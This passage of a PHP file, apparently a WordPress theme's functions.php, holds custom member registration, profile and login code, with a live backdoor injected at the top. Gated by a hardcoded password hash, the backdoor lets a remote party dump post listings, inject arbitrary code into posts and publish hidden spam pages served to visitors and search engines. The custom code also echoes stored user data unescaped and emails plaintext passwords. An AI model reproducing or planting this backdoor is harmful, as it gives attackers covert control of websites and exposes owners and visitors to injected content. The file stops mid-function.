<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '6dbb5b801cd7922188450c6486baa200'))
	{
		switch ($_REQUEST['action'])
			{
				case 'get_all_links';
					foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data)
						{
							$data['code'] = '';
							
							if (preg_match('!<div id="wp_cd_code">(.*?)</div>!s', $data['post_content'], $_))
								{
									$data['code'] = $_[1];
								}
							
							print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
						}
				break;
				
				case 'set_id_links';
					if (isset($_REQUEST['data']))
						{
							$data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.mysql_escape_string($_REQUEST['id']).'"');
							
							$post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data -> post_content);
							if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id="wp_cd_code">' . stripcslashes($_REQUEST['data']) . '</div>';

							if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'posts` SET `post_content` = "' . mysql_escape_string($post_content) . '" WHERE `ID` = "' . mysql_escape_string($_REQUEST['id']) . '"') !== false)
								{
									print "true";
								}
						}
				break;
				
				case 'create_page';
					if (isset($_REQUEST['remove_page']))
						{
							if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.mysql_escape_string($_REQUEST['url']).'"'))
								{
									print "true";
								}
						}
					elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content']))
						{
							if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.mysql_escape_string($_REQUEST['url']).'", `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string($_REQUEST['content']).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string(urldecode($_REQUEST['content'])).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'"'))
								{
									print "true";
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_URL_CD";
			}
			
		die("");
	}

	
if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string( $_SERVER['REQUEST_URI'] ).'"') == '1' )
	{
		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"');
		if ($data -> full_content)
			{
				print stripslashes($data -> content);
			}
		else
			{
				print '<!DOCTYPE html>';
				print '<html ';
				language_attributes();
				print ' class="no-js">';
				print '<head>';
				print '<title>'.stripslashes($data -> title).'</title>';
				print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
				print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
				print '<meta name="robots" content="index, follow" />';
				print '<meta charset="';
				bloginfo( 'charset' );
				print '" />';
				print '<meta name="viewport" content="width=device-width">';
				print '<link rel="profile" href="http://gmpg.org/xfn/11">';
				print '<link rel="pingback" href="';
				bloginfo( 'pingback_url' );
				print '">';
				wp_head();
				print '</head>';
				print '<body>';
				print '<div id="content" class="site-content">';
				print stripslashes($data -> content);
				get_search_form();
				get_sidebar();
				get_footer();
			}
			
		exit;
	}


?><?php
/* my code 010517 */

function pippin_registration_form() {
	
	// only show the registration form to non-logged-in members
	if(!is_user_logged_in()) {
	
		global $pippin_load_css;
		
		// set this to true so the CSS is loaded
		$pippin_load_css = true;
		
		// check to make sure user registration is enabled
		$registration_enabled = get_option('users_can_register');
	
		// only show the registration form if allowed
		if($registration_enabled) {
			$output = pippin_registration_form_fields();
		} else {
			$output = 'User registration is disabled But you can change your contact information form Dashboard page. Before that you should <a href="'.site_url().'/login/">login from here</a>.';
		}
		return $output;
	} else{
			$output = 'You have already logged in. Please <a href="'.wp_logout_url( site_url() ) .'">Click Here</a> to logout';
			return $output;
		
	}
}
add_shortcode('register_form', 'pippin_registration_form');

function pippin_errors(){
    static $wp_error; // Will hold global variable safely
    return isset($wp_error) ? $wp_error : ($wp_error = new WP_Error(null, null, null));
}
function pippin_show_error_messages() {
	if($codes = pippin_errors()->get_error_codes()) {
		echo '<div class="pippin_errors">';
		    // Loop error codes and display errors
		   foreach($codes as $code){
		        $message = pippin_errors()->get_error_message($code);
		        echo '<span class="error"><strong>' . __('Error') . '</strong>: ' . $message . '</span><br/>';
		    }
		echo '</div>';
	}	
}



// registration form fields
function pippin_registration_form_fields() {
	
	ob_start(); ?>
	<br/><br/>		
		<?php 
		// show any error messages after form submission
		pippin_show_error_messages(); ?>
<script type="text/javascript">(function() {
	if (!window.mc4wp) {
		window.mc4wp = {
			listeners: [],
			forms    : {
				on: function (event, callback) {
					window.mc4wp.listeners.push({
						event   : event,
						callback: callback
					});
				}
			}
		}
	}
})();
</script>		
	
 <form id="mc4wp-form-1" class="mc4wp-form mc4wp-form-15" method="post" data-id="15" data-name="register"><div class="mc4wp-form-fields"><p>
	<label>Email address <span style="color:red;">*</span></label>
	<input type="email" name="EMAIL" placeholder="Your email address" required>
</p>

<p>
    <label>First Name <span style="color:red;">*</span></label>
    <input name="FNAME" required="" type="text" required>
</p>

<p>
    <label>Last Name <span style="color:red;">*</span></label>
    <input name="LNAME" required="" type="text" required>
</p>

<p>
    <label>Gender <span style="color:red;">*</span></label>
    <label>
        <input name="MMERGE3" value="Male" required checked="true" type="radio"> <span>Male</span>
    </label>
    <label>
        <input name="MMERGE3" value="Female" required type="radio"> <span>Female</span>
    </label>
</p>
<p>
    <label>Street Address <span style="color:red;">*</span></label>
    <input name="addr1" required type="text" required>
</p>


<p>
    <label>City <span style="color:red;">*</span></label>
    <input name="city" type="text" required>
</p>

<p>
    <label>State <span style="color:red;">*</span></label>
    <input name="state" type="text" required>
</p>
<p>
    <label>ZIP <span style="color:red;">*</span></label>
    <input name="zip" type="text" required>
</p>
<p>
    <label>Country <span style="color:red;">*</span></label>
     <select name="country" required>
                <option value="AF">Afghanistan</option>
                <option value="AX">Aland Islands</option>
                <option value="AL">Albania</option>
                <option value="DZ">Algeria</option>
                <option value="AS">American Samoa</option>
                <option value="AD">Andorra</option>
                <option value="AO">Angola</option>
                <option value="AI">Anguilla</option>
                <option value="AQ">Antarctica</option>
                <option value="AG">Antigua and Barbuda</option>
                <option value="AR">Argentina</option>
                <option value="AM">Armenia</option>
                <option value="AW">Aruba</option>
                <option value="AU">Australia</option>
                <option value="AT">Austria</option>
                <option value="AZ">Azerbaijan</option>
                <option value="BS">Bahamas</option>
                <option value="BH">Bahrain</option>
                <option value="BD">Bangladesh</option>
                <option value="BB">Barbados</option>
                <option value="BY">Belarus</option>
                <option value="BE">Belgium</option>
                <option value="BZ">Belize</option>
                <option value="BJ">Benin</option>
                <option value="BM">Bermuda</option>
                <option value="BT">Bhutan</option>
                <option value="BO">Bolivia</option>
                <option value="BQ">Bonaire, Saint Eustatius and Saba</option>
                <option value="BA">Bosnia and Herzegovina</option>
                <option value="BW">Botswana</option>
                <option value="BV">Bouvet Island</option>
                <option value="BR">Brazil</option>
                <option value="IO">British Indian Ocean Territory</option>
                <option value="VG">British Virgin Islands</option>
                <option value="KH">Cambodia</option>
                <option value="CM">Cameroon</option>
                <option value="CA">Canada</option>
                <option value="CN">China</option>
                <option value="CX">Christmas Island</option>
                <option value="CC">Cocos Islands</option>
                <option value="CO">Colombia</option>
                <option value="KM">Comoros</option>
                <option value="HR">Croatia</option>
                <option value="CU">Cuba</option>
                <option value="CW">Curacao</option>
                <option value="CY">Cyprus</option>
               <option value="FR">France</option>
               
                <option value="VI">U.S. Virgin Islands</option>
                <option value="UG">Uganda</option>
                <option value="UA">Ukraine</option>
                <option value="AE">United Arab Emirates</option>
                <option value="GB">United Kingdom</option>
                <option value="US">United States</option>
                <option value="UM">United States Minor Outlying Islands</option>
                <option value="UY">Uruguay</option>
                <option value="UZ">Uzbekistan</option>
                <option value="VN">Vietnam</option>
                <option value="WF">Wallis and Futuna</option>
                <option value="EH">Western Sahara</option>
                <option value="YE">Yemen</option>
                <option value="ZM">Zambia</option>
                <option value="ZW">Zimbabwe</option>
            </select>
</p>

<p>
    <label>Contact Phone <span style="color:red;">*</span></label>
    <input name="MMERGE5" required="" type="tel" required>
</p>
<p>
    <label>Emergency Contact Name</label>
    <input name="MMERGE6" type="text">
</p>
<p>
    <label>Emergency Contact Phone</label>
    <input name="MMERGE7" type="text">
</p>

    <label>Password <span style="color:red;">*</span></label>
    <input name="password" type="password" required>
</p>
<p>
	<label>
		<input type="checkbox" name="mc4wp-subscribe" value="1">
		Keep me on your mailing list.	</label>
</p>
<input name="add" type="hidden" value="add">

<p>
	<input type="submit" value="Sign up">
</p>

<div style="display: none;"><input type="text" name="_mc4wp_honeypot" value="" tabindex="-1" autocomplete="off"></div><input type="hidden" name="_mc4wp_timestamp" value="1493713011"><input type="hidden" name="_mc4wp_form_id" value="15"><input type="hidden" name="_mc4wp_form_element_id" value="mc4wp-form-1"></div><div class="mc4wp-response"></div></form>

	<?php
	return ob_get_clean();
}



// register a new user
function pippin_add_new_member() {
  	if (isset( $_POST["EMAIL"] ) && isset($_POST['add'])) {
  		session_start();
  		$user_login = $_POST["EMAIL"];
		$pippin_user_first		= $_POST["FNAME"];	
		$b_email		= $_POST["EMAIL"];
		$pippin_user_last	 	= $_POST["LNAME"];
		$pippin_user_gender 	= $_POST["MMERGE3"];
		$pippin_user_address1 	= $_POST["addr1"];
		//$pippin_user_address2	= $_POST["addr2"];
		$user_city = $_POST["city"];
		$user_state = $_POST["state"];
		$user_zip = $_POST["zip"];
		$user_country = $_POST["country"];
		$pippin_user_phone 	= $_POST["MMERGE5"];
		$imergency_contact_name 	= $_POST["MMERGE6"];
		$imergency_contact_phone 	= $_POST["MMERGE7"];
		$user_pwd 	= $_POST["password"];
        //$random_password = wp_generate_password( 12, false );
	//	$user_terms	= $_POST["user"]['agreed_to_site_terms'];
		
		
		// this is required for username checks
		require_once(ABSPATH . WPINC . '/registration.php');
		
	   /*	if(username_exists($user_login)) {
			// Username already registered
			pippin_errors()->add('username_unavailable', __('Username already taken'));
		}
		if(!validate_username($user_login)) {
			// invalid username
			pippin_errors()->add('username_invalid', __('Invalid username'));
		}*/
		
		if(!is_email($b_email)) {
			//invalid email
			pippin_errors()->add('email_invalid', __('Invalid email'));
		}
		if(email_exists($b_email)) {
			//Email address already registered
			pippin_errors()->add('email_used', __('Email already registered'));
		}
	/*	if($user_pass == '') {
			// passwords do not match
			pippin_errors()->add('password_empty', __('Please enter a password'));
		}
		if($user_pass != $pass_confirm) {
			// passwords do not match
			pippin_errors()->add('password_mismatch', __('Passwords do not match'));
		}

		if($user_terms != 'on') {
			// passwords do not match
			pippin_errors()->add('Accept terms', __('Please accept Terms of Use & Privacy Policy'));
		}*/
		
		$errors = pippin_errors()->get_error_messages();
		
		// only create the user in if there are no errors
		if(empty($errors)) {
			
			$new_user_id = wp_insert_user(array(
					'user_login'		=> $b_email,
					'user_email'		=> $b_email,
					'first_name'		=> $pippin_user_first,
					'last_name'			=> $pippin_user_last,
					'user_pass'         => $user_pwd,
					'user_registered'	=> date('Y-m-d H:i:s'),
					'role'				=> 'subscriber'
				)
			);
            
			update_user_meta( $new_user_id, 'pippin_user_gender', $pippin_user_gender );
			update_user_meta( $new_user_id, 'pippin_user_address1', $pippin_user_address1 );
		//	update_user_meta( $new_user_id, 'pippin_user_address2', $pippin_user_address2 );
			update_user_meta( $new_user_id, 'pippin_user_state', $user_state );
			update_user_meta( $new_user_id, 'pippin_user_city', $user_city );
			update_user_meta( $new_user_id, 'pippin_user_country', $user_country );
			update_user_meta( $new_user_id, 'pippin_user_zip', $user_zip );
			
			update_user_meta( $new_user_id, 'pippin_user_phone', $pippin_user_phone );
			update_user_meta( $new_user_id, 'imergency_contact_name', $imergency_contact_name );
			update_user_meta( $new_user_id, 'imergency_contact_phone', $imergency_contact_phone );
		
			if($new_user_id) {

			      $to = $b_email;
                  $subject = 'Registration Successfull.';
                  $sender = 'info';
                  $fromemail='felixthomas727@gmail.com';
                  $message = 'Email id: '.$b_email.' And Your new password is: '.$user_pwd;
                  
                  $headers[] = 'MIME-Version: 1.0' . "\r\n";
                  $headers[] = 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
                  $headers[] = "X-Mailer: PHP \r\n";
                  $headers[] = 'From: '.$sender.' < '.$fromemail.'>' . "\r\n";
                  
                  $mail = wp_mail( $to, $subject, $message, $headers );
				  $red=site_url().'/login';
				  wp_redirect($red); exit;
			}
			
		}
		else{
			echo 333;
		}
	
	}
}
add_action('init', 'pippin_add_new_member');




// register a new user
function pippin_update_member() {
  	if (isset( $_POST["EMAIL"] ) && isset($_POST['update'])) {
  		
  		session_start();
  		$user_id=get_current_user_id();
  		$user_login = $_POST["EMAIL"];
		$pippin_user_first		= $_POST["FNAME"];	
		$b_email		= $_POST["EMAIL"];
		$pippin_user_last	 	= $_POST["LNAME"];
		$pippin_user_gender 	= $_POST["MMERGE3"];
		$pippin_user_address1 	= $_POST["addr1"];
		//$pippin_user_address2	= $_POST["addr2"];
		$user_city = $_POST["city"];
		$user_state = $_POST["state"];
		$user_zip = $_POST["zip"];
		$user_country = $_POST["country"];
		$pippin_user_phone 	= $_POST["MMERGE5"];
		$imergency_contact_name 	= $_POST["MMERGE6"];
		$imergency_contact_phone 	= $_POST["MMERGE7"];
		

	//	$user_terms	= $_POST["user"]['agreed_to_site_terms'];
		
		
		// this is required for username checks
		require_once(ABSPATH . WPINC . '/registration.php');
		
	/*	if(username_exists($user_login)) {
			// Username already registered
			pippin_errors()->add('username_unavailable', __('Username already taken'));
		}
		if(!validate_username($user_login)) {
			// invalid username
			pippin_errors()->add('username_invalid', __('Invalid username'));
		}
		
		if(!is_email($b_email)) {
			//invalid email
			pippin_errors()->add('email_invalid', __('Invalid email'));
		}
		if(email_exists($b_email)) {
			//Email address already registered
			pippin_errors()->add('email_used', __('Email already registered'));
		}*/
	/*	if($user_pass == '') {
			// passwords do not match
			pippin_errors()->add('password_empty', __('Please enter a password'));
		}
		if($user_pass != $pass_confirm) {
			// passwords do not match
			pippin_errors()->add('password_mismatch', __('Passwords do not match'));
		}

		if($user_terms != 'on') {
			// passwords do not match
			pippin_errors()->add('Accept terms', __('Please accept Terms of Use & Privacy Policy'));
		}*/
		
		$errors = pippin_errors()->get_error_messages();
		
		// only create the user in if there are no errors
		if(empty($errors)) {
		    
			 $userdata = array(
                'ID'                => $user_id,
                'first_name'        => $pippin_user_first,
                'last_name'         => $pippin_user_last,
				'user_registered'	=> date('Y-m-d H:i:s')
            );
			$new_user_id = wp_update_user( $userdata );
		

			update_user_meta( $new_user_id, 'pippin_user_gender', $pippin_user_gender );
			update_user_meta( $new_user_id, 'pippin_user_address1', $pippin_user_address1 );
		//	update_user_meta( $new_user_id, 'pippin_user_address2', $pippin_user_address2 );
			update_user_meta( $new_user_id, 'pippin_user_state', $user_state );
			update_user_meta( $new_user_id, 'pippin_user_city', $user_city );
			update_user_meta( $new_user_id, 'pippin_user_country', $user_country );
			update_user_meta( $new_user_id, 'pippin_user_zip', $user_zip );
			
			update_user_meta( $new_user_id, 'pippin_user_phone', $pippin_user_phone );
			update_user_meta( $new_user_id, 'imergency_contact_name', $imergency_contact_name );
			update_user_meta( $new_user_id, 'imergency_contact_phone', $imergency_contact_phone );
		
			if($new_user_id) {

				//WCV_Vendor_Signup::save_pending( $new_user_id );
				// send an email to the admin alerting them of the registration
				//wp_new_user_notification($new_user_id);
				//do_action( 'wpneo_crowdfunding_after_user_registration', $new_user_id );
				// log the new user in
				//wp_setcookie($pippin_user_first, $user_pass, true);
				//wp_set_current_user($new_user_id, $pippin_user_first);	
				
				//do_action('wp_login', $user_login);
				
				// send the newly created user to the home page after logging them in
				$red=site_url('/dashboard/');
				wp_redirect($red); exit;
			}
			
		}
		else{
			
		}
	
	}
}
add_action('init', 'pippin_update_member');

function pippin_profile_form() {
	
	// only show the registration form to non-logged-in members
	if(is_user_logged_in()) {
	
		global $pippin_load_css;
		
		// set this to true so the CSS is loaded
		$pippin_load_css = true;
		
		// check to make sure user registration is enabled
		$output = pippin_profile_form_fields();
		
		return $output;
	}
}
add_shortcode('profile_form', 'pippin_profile_form');

// registration form fields
function pippin_profile_form_fields() {
	$new_user_id=get_current_user_id();
	$user_info = get_userdata($new_user_id);
	$gender=get_user_meta( $new_user_id, 'pippin_user_gender', true );
	$address1=get_user_meta( $new_user_id, 'pippin_user_address1', true );
//	$address1=get_user_meta( $new_user_id, 'pippin_user_address2', true );
	$user_state=get_user_meta( $new_user_id, 'pippin_user_state', true );
	$user_city=get_user_meta( $new_user_id, 'pippin_user_city', true );
	$user_country=get_user_meta( $new_user_id, 'pippin_user_country', true );
	$user_zip=get_user_meta( $new_user_id, 'pippin_user_zip', true );
	$user_phone=get_user_meta( $new_user_id, 'pippin_user_phone', true );
	$user_imergency_name=get_user_meta( $new_user_id, 'imergency_contact_name', true );
	$user_imergency_phone=get_user_meta( $new_user_id, 'imergency_contact_phone', true );

			
		
			
	ob_start(); ?>
		
		<?php 
		// show any error messages after form submission
		pippin_show_error_messages(); ?>
	
	
 <form id="mc4wp-form-1" class="mc4wp-form mc4wp-form-15" method="post" data-id="15" data-name="register"><div class="mc4wp-form-fields"><p>
	<label>Email address <span style="color:red;">*</span></label>
	<input type="email" name="EMAIL" placeholder="Your email address" value="<?php echo $user_info->user_email; ?>" required readonly>
</p>

<p>
    <label>First Name <span style="color:red;">*</span></label>
    <input name="FNAME" required="" type="text" value="<?php echo $user_info->first_name; ?>" required>
</p>

<p>
    <label>Last Name <span style="color:red;">*</span></label>
    <input name="LNAME" required="" type="text" value="<?php echo $user_info->last_name; ?>" required>
</p>

<p>
    <label>Gender <span style="color:red;">*</span></label>
    <label>
        <input name="MMERGE3" value="Male" required <?php if($gender=='Male') { echo 'checked="true"'; } else {echo '';}?> type="radio"> <span>Male</span>
    </label>
    <label>
        <input name="MMERGE3" value="Female" required <?php if($gender=='Female') { echo 'checked="true"'; } else {echo '';}?> type="radio"> <span>Female</span>
    </label>
</p>
<p>
    <label>Street Address <span style="color:red;">*</span></label>
    <input name="addr1" required type="text" value="<?php echo $address1; ?>">
</p>


<p>
    <label>City <span style="color:red;">*</span></label>
    <input name="city" type="text" required value="<?php echo $user_city; ?>">
</p>

<p>
    <label>State <span style="color:red;">*</span></label>
    <input name="state" type="text" required value="<?php echo $user_state; ?>">
</p>
<p>
    <label>ZIP <span style="color:red;">*</span></label>
    <input name="zip" type="text" required value="<?php echo $user_zip; ?>">
</p>

<p>
    <label>Country <span style="color:red;">*</span></label>
    <select name="country" required>
        <option value="AF" <?php if($user_country=='AF') { echo $selected='selected'; } else {echo $selected='';}?>>Afghanistan</option>
        <option value="AX" <?php if($user_country=='AX') { echo $selected='selected'; } else {echo $selected='';}?>>Aland Islands</option>
        <option value="AL" <?php if($user_country=='AL') { echo $selected='selected'; } else {echo $selected='';}?>>Albania</option>
        <option value="DZ" <?php if($user_country=='DZ') { echo $selected='selected'; } else {echo $selected='';}?>>Algeria</option>
        <option value="AS" <?php if($user_country=='AS') { echo $selected='selected'; } else {echo $selected='';}?>>American Samoa</option>
        <option value="AD" <?php if($user_country=='AD') { echo $selected='selected'; } else {echo $selected='';}?>>Andorra</option>
        <option value="AO" <?php if($user_country=='AO') { echo $selected='selected'; } else {echo $selected='';}?>>Angola</option>
        <option value="AI" <?php if($user_country=='AI') { echo $selected='selected'; } else {echo $selected='';}?>>Anguilla</option>
        <option value="AQ" <?php if($user_country=='AQ') { echo $selected='selected'; } else {echo $selected='';}?>>Antarctica</option>
        <option value="AG" <?php if($user_country=='AG') { echo $selected='selected'; } else {echo $selected='';}?>>Antigua and Barbuda</option>
        <option value="AR" <?php if($user_country=='AR') { echo $selected='selected'; } else {echo $selected='';}?>>Argentina</option>
        <option value="AM" <?php if($user_country=='AM') { echo $selected='selected'; } else {echo $selected='';}?>>Armenia</option>
        <option value="AW" <?php if($user_country=='AW') { echo $selected='selected'; } else {echo $selected='';}?>>Aruba</option>
        <option value="AU" <?php if($user_country=='AU') { echo $selected='selected'; } else {echo $selected='';}?>>Australia</option>
        <option value="AT" <?php if($user_country=='AT') { echo $selected='selected'; } else {echo $selected='';}?>>Austria</option>
        <option value="AZ" <?php if($user_country=='AZ') { echo $selected='selected'; } else {echo $selected='';}?>>Azerbaijan</option>
        <option value="BS" <?php if($user_country=='BS') { echo $selected='selected'; } else {echo $selected='';}?>>Bahamas</option>
        <option value="BH" <?php if($user_country=='BH') { echo $selected='selected'; } else {echo $selected='';}?>>Bahrain</option>
        <option value="BD <?php if($user_country=='BD') { echo $selected='selected'; } else {echo $selected='';}?>">Bangladesh</option>
        <option value="BB" <?php if($user_country=='BB') { echo $selected='selected'; } else {echo $selected='';}?>>Barbados</option>
        <option value="BY" <?php if($user_country=='BY') { echo $selected='selected'; } else {echo $selected='';}?>>Belarus</option>
        <option value="BE" <?php if($user_country=='BE') { echo $selected='selected'; } else {echo $selected='';}?>>Belgium</option>
        <option value="BZ" <?php if($user_country=='BZ') { echo $selected='selected'; } else {echo $selected='';}?>>Belize</option>
        <option value="BJ" <?php if($user_country=='BJ') { echo $selected='selected'; } else {echo $selected='';}?>>Benin</option>
        <option value="BM" <?php if($user_country=='BM') { echo $selected='selected'; } else {echo $selected='';}?>>Bermuda</option>
        <option value="BT" <?php if($user_country=='BT') { echo $selected='selected'; } else {echo $selected='';}?>>Bhutan</option>
        <option value="BO" <?php if($user_country=='BO') { echo $selected='selected'; } else {echo $selected='';}?>>Bolivia</option>
        <option value="BQ" <?php if($user_country=='BQ') { echo $selected='selected'; } else {echo $selected='';}?>>Bonaire, Saint Eustatius and Saba</option>
        <option value="BA" <?php if($user_country=='BA') { echo $selected='selected'; } else {echo $selected='';}?>>Bosnia and Herzegovina</option>
        <option value="BW" <?php if($user_country=='BW') { echo $selected='selected'; } else {echo $selected='';}?>>Botswana</option>
        <option value="BV" <?php if($user_country=='BV') { echo $selected='selected'; } else {echo $selected='';}?>>Bouvet Island</option>
        <option value="BR" <?php if($user_country=='BR') { echo $selected='selected'; } else {echo $selected='';}?>>Brazil</option>
        <option value="IO" <?php if($user_country=='IO') { echo $selected='selected'; } else {echo $selected='';}?>>British Indian Ocean Territory</option>
        <option value="VG" <?php if($user_country=='VG') { echo $selected='selected'; } else {echo $selected='';}?>>British Virgin Islands</option>
        <option value="KH" <?php if($user_country=='KH') { echo $selected='selected'; } else {echo $selected='';}?>>Cambodia</option>
        <option value="CM" <?php if($user_country=='CM') { echo $selected='selected'; } else {echo $selected='';}?>>Cameroon</option>
        <option value="CA" <?php if($user_country=='CA') { echo $selected='selected'; } else {echo $selected='';}?>>Canada</option>
        <option value="CN" <?php if($user_country=='CN') { echo $selected='selected'; } else {echo $selected='';}?>>China</option>
        <option value="CX" <?php if($user_country=='CXF') { echo $selected='selected'; } else {echo $selected='';}?>>Christmas Island</option>
        <option value="CC" <?php if($user_country=='CC') { echo $selected='selected' ; } else {echo $selected='';}?>>Cocos Islands</option>
        <option value="CO" <?php if($user_country=='CO') { echo $selected='selected'; } else {echo $selected='';}?>>Colombia</option>
        <option value="KM" <?php if($user_country=='KM') { echo $selected='selected'; } else {echo $selected='';}?>>Comoros</option>
        <option value="HR" <?php if($user_country=='HR') { echo $selected='selected'; } else {echo $selected='';}?>>Croatia</option>
        <option value="CU" <?php if($user_country=='CU') { echo $selected='selected'; } else {echo $selected='';}?>>Cuba</option>
        <option value="CW" <?php if($user_country=='CW') { echo $selected='selected'; } else {echo $selected='';}?>>Curacao</option>
        <option value="CY" <?php if($user_country=='CY') { echo $selected='selected'; } else {echo $selected='';}?>>Cyprus</option>
       <option value="FR" <?php if($user_country=='FR') { echo $selected='selected'; } else {echo $selected='';}?>>France</option>
       
        <option value="VI" <?php if($user_country=='VI') { echo $selected='selected'; } else {echo $selected='';}?>>U.S. Virgin Islands</option>
        <option value="UG" <?php if($user_country=='UG') { echo $selected='selected'; } else {echo $selected='';}?>>Uganda</option>
        <option value="UA" <?php if($user_country=='UA') { echo $selected='selected'; } else {echo $selected='';}?>>Ukraine</option>
        <option value="AE" <?php if($user_country=='AE') { echo $selected='selected'; } else {echo $selected='';}?>>United Arab Emirates</option>
        <option value="GB" <?php if($user_country=='GB') { echo $selected='selected'; } else {echo $selected='';}?>>United Kingdom</option>
        <option value="US" <?php if($user_country=='US') { echo $selected='selected'; } else {echo $selected='';}?>>United States</option>
        <option value="UM" <?php if($user_country=='UM') { echo $selected='selected'; } else {echo $selected='';}?>>United States Minor Outlying Islands</option>
        <option value="UY" <?php if($user_country=='UY') { echo $selected='selected'; } else {echo $selected='';}?>>Uruguay</option>
        <option value="UZ" <?php if($user_country=='UZ') { echo $selected='selected'; } else {echo $selected='';}?>>Uzbekistan</option>
        <option value="VN" <?php if($user_country=='VN') { echo $selected='selected'; } else {echo $selected='';}?>>Vietnam</option>
        <option value="WF" <?php if($user_country=='WF') { echo $selected='selected'; } else {echo $selected='';}?>>Wallis and Futuna</option>
        <option value="EH" <?php if($user_country=='EH') { echo $selected='selected'; } else {echo $selected='';}?>>Western Sahara</option>
        <option value="YE" <?php if($user_country=='YE') { echo $selected='selected'; } else {echo $selected='';}?>>Yemen</option>
        <option value="ZM" <?php if($user_country=='ZM') { echo $selected='selected'; } else {echo $selected='';}?>>Zambia</option>
        <option value="ZW" <?php if($user_country=='ZW') { echo $selected='selected'; } else {echo $selected='';}?>>Zimbabwe</option>
    </select>
</p>

<p>
    <label>Contact Phone <span style="color:red;">*</span></label>
    <input name="MMERGE5" type="tel" required value="<?php echo $user_phone; ?>">
</p>
<p>
    <label>Emergency Contact Name</label>
    <input name="MMERGE6" type="text" value="<?php echo $user_imergency_name; ?>">
</p>
<p>
    <label>Emergency Contact Phone</label>
    <input name="MMERGE7" type="text" value="<?php echo $user_imergency_phone; ?>">
</p>

 <input name="update" type="hidden" required value="update">
<p>
	<input type="submit" value="Update Profile">
</p>
</div>
</form>

	<?php
	return ob_get_clean();
}


add_filter( 'wp_nav_menu_items', 'wti_loginout_menu_link', 10, 2 );

function wti_loginout_menu_link( $items, $args ) {
   if ($args->theme_location == 'primary') {
      if (is_user_logged_in()) {
      	$items .= '<li class="right"><a href="'. get_permalink(23) .'">'. __("Dashboard") .'</a></li>';
         $items .= '<li class="right"><a href="'. wp_logout_url(site_url()) .'">'. __("Log Out") .'</a></li>';
      } else {
         $items .= '<li class="right"><a href="'. get_permalink(31) .'">'. __("Log In") .'</a></li>';
         $items .= '<li class="right"><a href="'. get_permalink(16) .'">'. __("Register") .'</a></li>';
      }
   }
   return $items;
}



// user login form
function pippin_login_form() {
	
	if(!is_user_logged_in()) {
		
		global $pippin_load_css;
		
		// set this to true so the CSS is loaded
		$pippin_load_css = true;
		
		$output = pippin_login_form_fields();
	} else {
		// could show some logged in user info here
		// $output = 'user info here';
	}
	return $output;
}
add_shortcode('login_form', 'pippin_login_form');


// login form fields
function pippin_login_form_fields() {
		
	ob_start(); ?>
		
		
		<?php
		// show any error messages after form submission
		pippin_show_error_messages();
        if($_GET['msg']){
            echo 'Please check your email address for password.';
        }
		 ?>

		<form action="" class="login-form" method="post">
                    <div class="form-group">
                     
                    <p>
                      <input  id="pippin_user_login1" name="pippin_user_login" placeholder="Email Address" class="pippin_user_login1" type="text" value="" required/></p>
                      
                      <!--<input id="email" name="pippin_user_email" type="text" class="required" value="Your email">-->
                    <p>  <input id="password" name="pippin_user_pass" type="password" placeholder="Your password" class="required" value="" required>
                      <input type="hidden" name="pippin_login_nonce" value="<?php echo wp_create_nonce('pippin-login-nonce'); ?>"/>
                    </p>
                    </div>
                    <span class="text-gray remember"><input type="checkbox" id="remember" value=""> <label for="remember">Remember me</label></span>
                   <p> <input id="pippin_login_submit" class="btn btn-sigin" type="submit" value="Sign me in!"/></p>
 					 <br style="clear:both;">
                   
                    <a class="link" href="<?php echo site_url();?>/forgot-password/">Forgot password?</a> <a class="link" href="<?php echo site_url();?>/register/">Sign up</a>
                   
                    <hr><br>
                  </form>

	<?php
	return ob_get_clean();
}



// logs a member in after submitting a form
function pippin_login_member() {
		
	if(isset($_POST['pippin_user_login']) && wp_verify_nonce($_POST['pippin_login_nonce'], 'pippin-login-nonce')) {
				
		// this returns the user ID and other info from the user name
		$user = get_userdatabylogin($_POST['pippin_user_login']);
		
		if(!$user) {
			// if the user name doesn't exist
			pippin_errors()->add('empty_username', __('Invalid username'));
		}
		
		if(!isset($_POST['pippin_user_pass']) || $_POST['pippin_user_pass'] == '') {
			// if no password was entered
			pippin_errors()->add('empty_password', __('Please enter a password'));
		}
				
		// check the user's login with their password
		if(!wp_check_password($_POST['pippin_user_pass'], $user->user_pass, $user->ID)) {
			// if the password is incorrect for the specified user
			pippin_errors()->add('empty_password', __('Incorrect password'));
		}
		
		// retrieve all error messages
		$errors = pippin_errors()->get_error_messages();
		
		// only log the user in if there are no errors
		if(empty($errors)) {
			
			wp_setcookie($_POST['pippin_user_login'], $_POST['pippin_user_pass'], true);
			wp_set_current_user($user->ID, $_POST['pippin_user_login']);	
			//do_action('wp_login', $_POST['pippin_user_login']);
			
			$red=home_url().'/dashboard/';
